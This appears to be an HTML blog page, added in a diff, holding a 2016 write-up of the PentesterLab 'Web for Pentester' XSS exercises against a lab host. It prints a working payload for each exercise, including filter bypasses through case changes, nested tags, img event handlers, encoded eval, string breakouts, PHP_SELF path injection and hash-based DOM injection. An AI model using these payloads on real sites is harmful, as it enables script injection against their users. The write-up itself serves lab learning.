@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="RootNetSec is a site about journey through the world of network security, pentesting, Linux administration, programming an networking. View to learn more!">
+    <meta name="author" content="W3ndige">
+    <title>Web for Pentester - Root Network Security</title>
+
+    <link rel="canonical" href="http://localhost:4000/2016/09/01/xss-exercises/">
+    <link rel="shortcut icon" type="image/x-icon" href="/favicon.png">
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/clean-blog.css">
+
+    <!-- Pygments Github CSS -->
+    <link rel="stylesheet" href="/css/syntax.css">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+    <link href="//https://fonts.googleapis.com/css?family=Nunito:400,700i" rel="stylesheet">
+    <link href='//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+
+    <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Root Network Security" />
+
+</head>
+
+
+<body>
+
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Root Network Security</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+            <ul class="nav navbar-nav navbar-right">
+                <li>
+                    <a href="/about/">About</a>
+                </li>
+
+                <li>
+                    <a href="/archive/">Archive</a>
+                </li>
+
+                <li>
+                    <a href="/contact/">Contact</a>
+                </li>
+
+                <li>
+                    <a href="/projects/">Projects</a>
+                </li>
+
+                <li>
+                    <a href="/resources/">Resources</a>
+                </li>
+            </ul>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+
+
+    <!-- Post Header -->
+<header class="intro-header" style="background-image: url('/img/cross-site-scripting-header.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <h1>Web for Pentester</h1>
+                    
+                    <h2 class="subheading">XSS Write-Up</h2>
+                    
+                    <span class="meta">Posted by W3ndige on September 1, 2016</span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+
+				<p>Today we're going to continue our journey through the word of web application security - more accurately XSS exercises from <a href="https://pentesterlab.com/">PentesterLab</a>. It's great way to practice what we have learned so far and also - good challenge. Let's jump into the first one!</p>
+
+<h3>Exercise 1</h3>
+
+<p>Here we have a very basic example of Cross Site Scripting where you have to change the variable that is visible in the URL (which is our example is <i>name=hacker</i>) into the alert script that will allow us to see whether if it works. </p>
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html">http://192.168.0.12/xss/example1.php?name=<span class="nt">&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="s2">"Xss"</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span></code></pre></figure>
+
+<p><img src="/img/xss-exercise/exercise-1.png" alt="exercise-1" class="img-responsive" /></p>
+
+<p>Great, it works perfectly, let's move to the next one!</p>
+
+<h3>Exercise 2</h3>
+<p>Firstly I wanted to try whether the method from the previous one works but as I suspected it didn't. What we got after entering script was this source code. </p>
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>
+Hello
+alert("Xss")</code></pre></figure>
+
+<p>It may be somehow filtering our input - maybe changing it to uppercase will help us? </p>
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html">http://192.168.0.12/xss/example2.php?name=<span class="nt">&lt;sCript&gt;</span>alert("Xss")<span class="nt">&lt;/sCript&gt;</span></code></pre></figure>
+
+<p>Great! It works and we've bypassed the filter. Let's move on to the next one! </p>
+
+<h3>Exercise 3</h3>
+
+<p>This one is a little harder - it doesn't allow <b>script</b> or even <b>sCript</b> so we have to try something else. From what I learned about methods to bypass filtering it may be possible to use this simple trick. </p>
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html">http://192.168.0.12/xss/example3.php?name=<span class="nt">&lt;scr</span><span class="err">&lt;</span><span class="na">script</span><span class="nt">&gt;</span>ipt&gt;alert("Xss")<span class="err">&lt;</span>/scr<span class="nt">&lt;/script&gt;</span>ipt&gt;</code></pre></figure>
+
+<p>If you don't know how this works - the filter firstly looks for <i>script</i> tag, deletes it, and then sends the result. But after taking out the script two other parts <b>scr</b> and <b>ipt</b> will merge into one creating our payload. </p>
+
+<h3>Exercise 4</h3>
+
+<p>Here it looks like more advanced version of filter, it completely takes out the word script and when the request matches script, it will stop. So what options do we have to bypass it? We can put <b>img</b> tag with some attributes allowing us to create a paylod. Onmouseover will be an excellent example but you can use any other you will think that will work. </p>
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html">http://192.168.0.12/xss/example4.php?name=<span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"blabla"</span> <span class="na">onmouseover=</span><span class="s">"alert('XSS')"</span><span class="nt">&gt;&lt;/img&gt;</span></code></pre></figure>
+
+<p>It will even better work with <b>onerror</b> since it will execute automatically when the page loads. </p>
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html">http://192.168.0.12/xss/example4.php?name=<span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"blabla"</span> <span class="na">onerror=</span><span class="s">"alert('XSS')"</span><span class="nt">&gt;&lt;/img&gt;</span></code></pre></figure>
+
+<h3>Exercise 5</h3>
+
+<p>This one is a little trickier - it allows <b>script</b> tags but doesn't allow <b>alert</b> function. How can we make it alert something without actually typing it? We can translate this into the ASCII characters. </p>
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html">alert("XSS") = 097 108 101 114 116 040 034 088 083 083 034 041</code></pre></figure>
+
+<p>Which after small redesign will result in actually working XSS!</p>
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html">http://192.168.0.12/xss/example5.php?name=<span class="nt">&lt;script&gt;</span><span class="nb">eval</span><span class="p">(</span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="mi">97</span><span class="p">,</span><span class="mi">108</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">116</span><span class="p">,</span><span class="mi">40</span><span class="p">,</span><span class="mi">34</span><span class="p">,</span><span class="mi">88</span><span class="p">,</span><span class="mi">83</span><span class="p">,</span><span class="mi">83</span><span class="p">,</span><span class="mi">34</span><span class="p">,</span><span class="mi">41</span><span class="p">))</span><span class="nt">&lt;/script&gt;</span></code></pre></figure>
+
+<h3>Exercise 6</h3>
+
+<p>This one is a little different. After looking into the source code (which you should always do at the beginning) we get this small JavaScript code. </p>
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html">Hello
+<span class="nt">&lt;script&gt;</span>
+	<span class="kd">var</span> <span class="nx">$a</span><span class="o">=</span> <span class="s2">"hacker"</span><span class="p">;</span>
+<span class="nt">&lt;/script&gt;</span></code></pre></figure>
+
+<p>Vaule of $a changes everytime we enter something different in <b>name=</b> field. We can try to manipulate this script into running alert function. Firstly I add <b>"</b> character to indicate that text is before this quotiation mark. Then let's add <b>;</b> as it's always used in JavaScript at the end of a line. After that I'm ready to add <b>alert('XSS')</b> but it still won't work because of the quotiation mark at the end of the input so let's try commenting it out with <b>//</b>. And it works!</p>
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html">http://192.168.0.12/xss/example6.php?name=me";alert('XSS')//</code></pre></figure>
+
+<h3>Exercise 7</h3>
+
+<p>Here w're dealing with similar challenge as in the previous one. </p>
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html">Hello
+<span class="nt">&lt;script&gt;</span>
+	<span class="kd">var</span> <span class="nx">$a</span><span class="o">=</span> <span class="s1">'hacker'</span><span class="p">;</span>
+<span class="nt">&lt;/script&gt;</span></code></pre></figure>
+
+<p>Using the previous strategy I manage to get the XSS alert working. </p>
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html">http://192.168.0.12/xss/example7.php?name=hacker';alert('XSS');//</code></pre></figure>
+
+<h3>Exercise 8</h3>
+<p>Hmmm... We've got the input field that will not allow any of our XSS tricks. I actually had no idea how to attack this example so I checked out hints provided by PentesterLab. Let's take a look at them. </p>
+
+<p><i>Here, the value echoed back in the page is correctly encoded. However, there is still a XSS vulnerability in this page. To build the form, the developer used and trusted PHP_SELF which is the path provided by the user. It’s possible to manipulate the path of the application in order to:</i></p>
+<ol>
+<li><i>call the current page (however you will get an HTTP 404 page);</i></li>
+<li><i>get a XSS payload in the page.</i></li>
+</ol>
+<p><i>This can be done because the current configuration of the server will call /xss/example8.php when any URL matching /xss/example8.php/... is accessed. You can simply get your payload inside the page by accessing /xss/example8.php/[XSS_PAYLOAD]. Now that you know where to inject your payload, you will need to adapt it to get it to work and get the famous alert box.</i></p>
+
+<p>Wow, I haven't thought about that. Let's see what happens if we simply add it <b>/xss/example8.php/[XSS_PAYLOAD]</b> like in here. </p>
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html">http://192.168.0.12/xss/example8.php/<span class="nt">&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="s2">"XSS"</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span></code></pre></figure>
+
+<p>But it still doesn't work. We have to somehow tweak it into the working version. </p>
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"/xss/example8.php/&lt;script&gt;alert("</span><span class="na">XSS</span><span class="err">")&lt;/</span><span class="na">script</span><span class="nt">&gt;</span>" method="POST"&gt;
+  Your name:<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"name"</span> <span class="nt">/&gt;</span>
+  <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">name=</span><span class="s">"submit"</span><span class="nt">/&gt;</span></code></pre></figure>
+
+<p>If we take a look at it a little closer we can see that if we add <b>"&gt;</b> after the example8.php it will close the path and allow script to execute. </p>
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html">http://192.168.0.12/xss/example8.php/"&gt;<span class="nt">&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="s2">"XSS"</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span></code></pre></figure>
+
+<p>To the last one!</p>
+
+<h3>Exercise 9</h3>
+<p>By looking at the source code it reveals to us that the script is simply executing everything after the hash string.</p>
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;script&gt;</span>
+    <span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mi">1</span><span class="p">));</span>
+<span class="nt">&lt;/script&gt;</span></code></pre></figure>
+
+<p>Solution will look like this. I don't know why but it worked for me only in Chrome browser, not in Firefox. Luckily we managed to complete this set of exercises. </p>
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html">http://192.168.0.12/xss/example9.php#<span class="nt">&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="s2">"XSs"</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span></code></pre></figure>
+
+<p>Thanks for tuning in! It was great challenge, and I'm sure to complete other exercise on Web for Pentester ISO. Hopefully there will be more XSS challenges as I'm really enjoying them. Stay updated for more and remember... </p>
+<p>~ Stay safe!</p>
+
+
+                <hr>
+
+                <ul class="pager">
+                    
+                    <li class="previous">
+                        <a href="/2016/08/29/introduction-to-ddos/" data-toggle="tooltip" data-placement="top" title="Distributed Denial of Service Attack">&larr; Previous Post</a>
+                    </li>
+                    
+                    
+                    <li class="next">
+                        <a href="/2016/09/05/python-password-generator/" data-toggle="tooltip" data-placement="top" title="Simple Password Generator">Next Post &rarr;</a>
+                    </li>
+                    
+                </ul>
+
+            </div>
+        </div>
+    </div>
+</article>
+
+<hr>
+
+
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                    <li>
+                        <a href="/feed.xml">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-rss fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    
+                    <li>
+                        <a href="https://github.com/w3ndige">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li>
+                        <a href="mailto:w3ndige@protonmail.com">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-envelope fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                </ul>
+                <p class="copyright text-muted">Copyright &copy; RootNetSec 2016 - 2017</p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js "></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js "></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/clean-blog.min.js "></script>
+
+
+</body>
+
+</html>
